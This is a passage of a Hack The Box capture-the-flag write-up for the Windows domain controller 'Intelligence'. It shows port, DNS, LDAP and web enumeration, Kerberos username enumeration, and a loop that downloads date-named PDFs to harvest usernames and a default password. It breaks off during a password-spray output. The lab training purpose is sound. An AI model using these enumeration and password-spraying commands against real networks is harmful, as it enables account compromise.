---
title: "[HTB] Machine: Intelligence"
description: "[HTB] Machine: Intelligence"
date: 2023-09-06
menu:
  sidebar:
    name: "[HTB] Machine: Intelligence"
    identifier: htb-machine-Intelligence
    parent: htb-machines-windows
    weight: 10
hero: images/intelligence.png
tags: ["HTB", "crackmapexec", "smbmap", "smbclient", "smb", "dns", "dnsenum", "ldapsearch", "exiftool", "kerbrute", "password-spray", "bloodhound", "bloodhound-py", "dnstool", "responder", "hashcat", "readgmsapassword", "gmsa", "gmsadumper", "silver-ticket", "wmiexec", "psexec", "delegations"]
---

# Intelligence
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.248 -T4                                                            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:07 BST
Nmap scan report for 10.10.10.248 (10.10.10.248)
Host is up (0.095s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49708/tcp open  unknown
49714/tcp open  unknown
```
```
└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sC -sV 10.10.10.248 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:11 BST
Nmap scan report for 10.10.10.248 (10.10.10.248)
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-06 23:10:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-06T23:11:57+00:00; +6h59m24s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-06T23:11:17
|_  start_date: N/A
|_clock-skew: mean: 6h59m23s, deviation: 0s, median: 6h59m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.24 seconds

```
```
└─$ sudo nmap -sU --top-ports 10 -sV -sC 10.10.10.248
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:23 BST
Nmap scan report for 10.10.10.248 (10.10.10.248)
Host is up (0.10s latency).

PORT     STATE         SERVICE      VERSION
53/udp   open          domain       Simple DNS Plus
67/udp   open|filtered dhcps
123/udp  open          ntp          NTP v3
| ntp-info: 
|_  
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m24s

```
- `smb`
```
└─$ smbclient -N -L //10.10.10.248                         
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
- `dns`
```
└─$ dig  @dc.intelligence.htb intelligence.htb 

; <<>> DiG 9.18.16-1-Debian <<>> @dc.intelligence.htb intelligence.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1581
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;intelligence.htb.              IN      A

;; ANSWER SECTION:
intelligence.htb.       600     IN      A       10.10.10.248

;; Query time: 95 msec
;; SERVER: 10.10.10.248#53(dc.intelligence.htb) (UDP)
;; WHEN: Wed Sep 06 17:29:23 BST 2023
;; MSG SIZE  rcvd: 61
```
```
└─$ dig axfr @dc.intelligence.htb intelligence.htb

; <<>> DiG 9.18.16-1-Debian <<>> axfr @dc.intelligence.htb intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
```
└─$ dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt intelligence.htb      
dnsenum VERSION:1.2.6

-----   intelligence.htb   -----                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Host's addresses:                                                                                                                                                                                                                           
__________________                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
intelligence.htb.                        600      IN    A        10.10.10.248                                                                                                                                                               

                                                                                                                                                                                                                                            
Name Servers:                                                                                                                                                                                                                               
______________                                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
dc.intelligence.htb.                     3600     IN    A        10.10.10.248                                                                                                                                                               

                                                                                                                                                                                                                                            
Mail (MX) Servers:                                                                                                                                                                                                                          
___________________                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Trying Zone Transfers and getting Bind Versions:                                                                                                                                                                                            
_________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                            
unresolvable name: dc.intelligence.htb at /usr/bin/dnsenum line 900.                                                                                                                                                                        
                                                                                                                                                                                                                                            
Trying Zone Transfer for intelligence.htb on dc.intelligence.htb ... 
AXFR record query failed: no nameservers

                                                                                                                                                                                                                                            
Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:                                                                                                                                                     
________________________________________________________________________________________                                                                                                                                                    
                                                                                                                                                                                                                                            
dc.intelligence.htb.                     3600     IN    A        10.10.10.248
domaindnszones.intelligence.htb.         600      IN    A        10.10.10.248
forestdnszones.intelligence.htb.         600      IN    A        10.10.10.248


intelligence.htb class C netranges:
____________________________________



Performing reverse lookup on 0 ip addresses:
_____________________________________________


0 results out of 0 IP addresses.


intelligence.htb ip blocks:
____________________________


done.
```
- `ldap`
```
└─$ ldapsearch -H ldap://10.10.10.248 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
```
└─$ ldapsearch -H ldap://10.10.10.248 -x -b "DC=intelligence,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=intelligence,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

- Web Server
  - `contact@intelligence.htb`
  - `http://intelligence.htb/documents/2020-01-01-upload.pdf`
  - `http://intelligence.htb/documents/2020-12-15-upload.pdf`

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://intelligence.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://intelligence.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/09/06 17:57:47 Starting gobuster in directory enumeration mode
===============================================================
/documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/documents/]

```

- Check `pdf` files
```
└─$ exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.64
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2023:09:06 17:59:11+01:00
File Access Date/Time           : 2023:09:06 17:59:11+01:00
File Inode Change Date/Time     : 2023:09:06 17:59:11+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```
```
└─$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.64
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2023:09:06 17:59:07+01:00
File Access Date/Time           : 2023:09:06 17:59:07+01:00
File Inode Change Date/Time     : 2023:09:06 17:59:07+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

```
## Foothold
- We have 2 possible users
  - Let's test them with `kerbrute`
```
└─$ kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.list 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/06/23 - Ronnie Flathers @ropnop

2023/09/06 18:02:35 >  Using KDC(s):
2023/09/06 18:02:35 >   dc.intelligence.htb:88

2023/09/06 18:02:36 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/09/06 18:02:36 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/09/06 18:02:36 >  Done! Tested 2 usernames (2 valid) in 0.137 seconds
```
- Let's check for `AS-REP`-roasting
```
└─$ impacket-GetNPUsers -no-pass -dc-ip dc.intelligence.htb intelligence.htb/William.Lee 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for William.Lee
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```
```
└─$ impacket-GetNPUsers -no-pass -dc-ip dc.intelligence.htb intelligence.htb/Jose.Williams
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for Jose.Williams
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- I was stuck here for a while, so got a hint fuzz for `pdf` documents
  - So we probably need to fuzz, download and go through `pdf`s
```
└─$ for year in 2020 2021; do (for month in `cat months.list`; do ( for day in `cat days.list`; do (wget http://intelligence.htb/documents/$year-$month-$day-upload.pdf 2>/dev/null); done; ); done;); done;
```
```
2020-01-01-upload.pdf  2020-02-23-upload.pdf  2020-04-15-upload.pdf  2020-06-02-upload.pdf  2020-06-26-upload.pdf  2020-08-19-upload.pdf  2020-09-29-upload.pdf  2020-11-30-upload.pdf  2021-02-10-upload.pdf
2020-01-02-upload.pdf  2020-02-24-upload.pdf  2020-04-23-upload.pdf  2020-06-03-upload.pdf  2020-06-28-upload.pdf  2020-08-20-upload.pdf  2020-09-30-upload.pdf  2020-12-10-upload.pdf  2021-02-13-upload.pdf
2020-01-04-upload.pdf  2020-02-28-upload.pdf  2020-05-01-upload.pdf  2020-06-04-upload.pdf  2020-06-30-upload.pdf  2020-09-02-upload.pdf  2020-10-05-upload.pdf  2020-12-15-upload.pdf  2021-02-21-upload.pdf
2020-01-10-upload.pdf  2020-03-04-upload.pdf  2020-05-03-upload.pdf  2020-06-07-upload.pdf  2020-07-02-upload.pdf  2020-09-04-upload.pdf  2020-10-19-upload.pdf  2020-12-20-upload.pdf  2021-02-25-upload.pdf
2020-01-20-upload.pdf  2020-03-05-upload.pdf  2020-05-07-upload.pdf  2020-06-08-upload.pdf  2020-07-06-upload.pdf  2020-09-05-upload.pdf  2020-11-01-upload.pdf  2020-12-24-upload.pdf  2021-03-01-upload.pdf
2020-01-22-upload.pdf  2020-03-12-upload.pdf  2020-05-11-upload.pdf  2020-06-12-upload.pdf  2020-07-08-upload.pdf  2020-09-06-upload.pdf  2020-11-03-upload.pdf  2020-12-28-upload.pdf  2021-03-07-upload.pdf
2020-01-23-upload.pdf  2020-03-13-upload.pdf  2020-05-17-upload.pdf  2020-06-14-upload.pdf  2020-07-20-upload.pdf  2020-09-11-upload.pdf  2020-11-06-upload.pdf  2020-12-30-upload.pdf  2021-03-10-upload.pdf
2020-01-25-upload.pdf  2020-03-17-upload.pdf  2020-05-20-upload.pdf  2020-06-15-upload.pdf  2020-07-24-upload.pdf  2020-09-13-upload.pdf  2020-11-10-upload.pdf  2021-01-03-upload.pdf  2021-03-18-upload.pdf
2020-01-30-upload.pdf  2020-03-21-upload.pdf  2020-05-21-upload.pdf  2020-06-21-upload.pdf  2020-08-01-upload.pdf  2020-09-16-upload.pdf  2020-11-11-upload.pdf  2021-01-14-upload.pdf  2021-03-21-upload.pdf
2020-02-11-upload.pdf  2020-04-02-upload.pdf  2020-05-24-upload.pdf  2020-06-22-upload.pdf  2020-08-03-upload.pdf  2020-09-22-upload.pdf  2020-11-13-upload.pdf  2021-01-25-upload.pdf  2021-03-25-upload.pdf
2020-02-17-upload.pdf  2020-04-04-upload.pdf  2020-05-29-upload.pdf  2020-06-25-upload.pdf  2020-08-09-upload.pdf  2020-09-27-upload.pdf  2020-11-24-upload.pdf  2021-01-30-upload.pdf  2021-03-27-upload.pdf
```
- Now we need go through them
  - Let's get all `Creators`
```
└─$ exiftool *pdf | grep Creator | cut -d':' -f2 | sort | uniq
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```
- Now we can use `pdftotext` to convert `pdf` to text 
```
└─$ for file in `ls *.pdf`; do (pdftotext $file); done
```
```
2020-01-01-upload.pdf  2020-02-17-upload.txt  2020-04-04-upload.pdf  2020-05-24-upload.txt  2020-06-22-upload.pdf  2020-08-01-upload.txt  2020-09-16-upload.pdf  2020-11-10-upload.txt  2021-01-03-upload.pdf  2021-03-10-upload.txt
2020-01-01-upload.txt  2020-02-23-upload.pdf  2020-04-04-upload.txt  2020-05-29-upload.pdf  2020-06-22-upload.txt  2020-08-03-upload.pdf  2020-09-16-upload.txt  2020-11-11-upload.pdf  2021-01-03-upload.txt  2021-03-18-upload.pdf
2020-01-02-upload.pdf  2020-02-23-upload.txt  2020-04-15-upload.pdf  2020-05-29-upload.txt  2020-06-25-upload.pdf  2020-08-03-upload.txt  2020-09-22-upload.pdf  2020-11-11-upload.txt  2021-01-14-upload.pdf  2021-03-18-upload.txt
2020-01-02-upload.txt  2020-02-24-upload.pdf  2020-04-15-upload.txt  2020-06-02-upload.pdf  2020-06-25-upload.txt  2020-08-09-upload.pdf  2020-09-22-upload.txt  2020-11-13-upload.pdf  2021-01-14-upload.txt  2021-03-21-upload.pdf
2020-01-04-upload.pdf  2020-02-24-upload.txt  2020-04-23-upload.pdf  2020-06-02-upload.txt  2020-06-26-upload.pdf  2020-08-09-upload.txt  2020-09-27-upload.pdf  2020-11-13-upload.txt  2021-01-25-upload.pdf  2021-03-21-upload.txt
2020-01-04-upload.txt  2020-02-28-upload.pdf  2020-04-23-upload.txt  2020-06-03-upload.pdf  2020-06-26-upload.txt  2020-08-19-upload.pdf  2020-09-27-upload.txt  2020-11-24-upload.pdf  2021-01-25-upload.txt  2021-03-25-upload.pdf
2020-01-10-upload.pdf  2020-02-28-upload.txt  2020-05-01-upload.pdf  2020-06-03-upload.txt  2020-06-28-upload.pdf  2020-08-19-upload.txt  2020-09-29-upload.pdf  2020-11-24-upload.txt  2021-01-30-upload.pdf  2021-03-25-upload.txt
2020-01-10-upload.txt  2020-03-04-upload.pdf  2020-05-01-upload.txt  2020-06-04-upload.pdf  2020-06-28-upload.txt  2020-08-20-upload.pdf  2020-09-29-upload.txt  2020-11-30-upload.pdf  2021-01-30-upload.txt  2021-03-27-upload.pdf
2020-01-20-upload.pdf  2020-03-04-upload.txt  2020-05-03-upload.pdf  2020-06-04-upload.txt  2020-06-30-upload.pdf  2020-08-20-upload.txt  2020-09-30-upload.pdf  2020-11-30-upload.txt  2021-02-10-upload.pdf  2021-03-27-upload.txt
2020-01-20-upload.txt  2020-03-05-upload.pdf  2020-05-03-upload.txt  2020-06-07-upload.pdf  2020-06-30-upload.txt  2020-09-02-upload.pdf  2020-09-30-upload.txt  2020-12-10-upload.pdf  2021-02-10-upload.txt
2020-01-22-upload.pdf  2020-03-05-upload.txt  2020-05-07-upload.pdf  2020-06-07-upload.txt  2020-07-02-upload.pdf  2020-09-02-upload.txt  2020-10-05-upload.pdf  2020-12-10-upload.txt  2021-02-13-upload.pdf
2020-01-22-upload.txt  2020-03-12-upload.pdf  2020-05-07-upload.txt  2020-06-08-upload.pdf  2020-07-02-upload.txt  2020-09-04-upload.pdf  2020-10-05-upload.txt  2020-12-15-upload.pdf  2021-02-13-upload.txt
2020-01-23-upload.pdf  2020-03-12-upload.txt  2020-05-11-upload.pdf  2020-06-08-upload.txt  2020-07-06-upload.pdf  2020-09-04-upload.txt  2020-10-19-upload.pdf  2020-12-15-upload.txt  2021-02-21-upload.pdf
2020-01-23-upload.txt  2020-03-13-upload.pdf  2020-05-11-upload.txt  2020-06-12-upload.pdf  2020-07-06-upload.txt  2020-09-05-upload.pdf  2020-10-19-upload.txt  2020-12-20-upload.pdf  2021-02-21-upload.txt
2020-01-25-upload.pdf  2020-03-13-upload.txt  2020-05-17-upload.pdf  2020-06-12-upload.txt  2020-07-08-upload.pdf  2020-09-05-upload.txt  2020-11-01-upload.pdf  2020-12-20-upload.txt  2021-02-25-upload.pdf
2020-01-25-upload.txt  2020-03-17-upload.pdf  2020-05-17-upload.txt  2020-06-14-upload.pdf  2020-07-08-upload.txt  2020-09-06-upload.pdf  2020-11-01-upload.txt  2020-12-24-upload.pdf  2021-02-25-upload.txt
2020-01-30-upload.pdf  2020-03-17-upload.txt  2020-05-20-upload.pdf  2020-06-14-upload.txt  2020-07-20-upload.pdf  2020-09-06-upload.txt  2020-11-03-upload.pdf  2020-12-24-upload.txt  2021-03-01-upload.pdf
2020-01-30-upload.txt  2020-03-21-upload.pdf  2020-05-20-upload.txt  2020-06-15-upload.pdf  2020-07-20-upload.txt  2020-09-11-upload.pdf  2020-11-03-upload.txt  2020-12-28-upload.pdf  2021-03-01-upload.txt
2020-02-11-upload.pdf  2020-03-21-upload.txt  2020-05-21-upload.pdf  2020-06-15-upload.txt  2020-07-24-upload.pdf  2020-09-11-upload.txt  2020-11-06-upload.pdf  2020-12-28-upload.txt  2021-03-07-upload.pdf
2020-02-11-upload.txt  2020-04-02-upload.pdf  2020-05-21-upload.txt  2020-06-21-upload.pdf  2020-07-24-upload.txt  2020-09-13-upload.pdf  2020-11-06-upload.txt  2020-12-30-upload.pdf  2021-03-07-upload.txt
2020-02-17-upload.pdf  2020-04-02-upload.txt  2020-05-24-upload.pdf  2020-06-21-upload.txt  2020-08-01-upload.pdf  2020-09-13-upload.txt  2020-11-10-upload.pdf  2020-12-30-upload.txt  2021-03-10-upload.pdf
```
- We also have to check if found users are valid
```
└─$ ~/Documents/Tools/kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.list  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/06/23 - Ronnie Flathers @ropnop

2023/09/06 18:52:22 >  Using KDC(s):
2023/09/06 18:52:22 >   dc.intelligence.htb:88

2023/09/06 18:52:22 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2023/09/06 18:52:22 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2023/09/06 18:52:23 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2023/09/06 18:52:23 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/09/06 18:52:23 >  Done! Tested 30 usernames (30 valid) in 0.660 seconds
```
- Okay, now we can go through every `doc` and look for interesting information
```
└─$ grep -in "pass" *.txt     
2020-06-04-upload.txt:3:Please login using your username and the default password of:
2020-06-04-upload.txt:5:After logging in please change your password as soon as possible.
```
```
└─$ cat 2020-06-04-upload.txt           
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

- We have a password, let's password spray
  - We can also test it via `kerbrute passwordspray --dc dc.intelligence.htb -d intelligence.htb users.list 'NewIntelligenceCorpUser9876' -v`
  - But if it shows no hits, it could be due to `KRB_AP_ERR_SKEW Clock skew too great` error, which I had
    - So you need to sync your machine time with the box
```
└─$ crackmapexec smb dc.intelligence.htb -u users.list -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         dc.intelligence.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
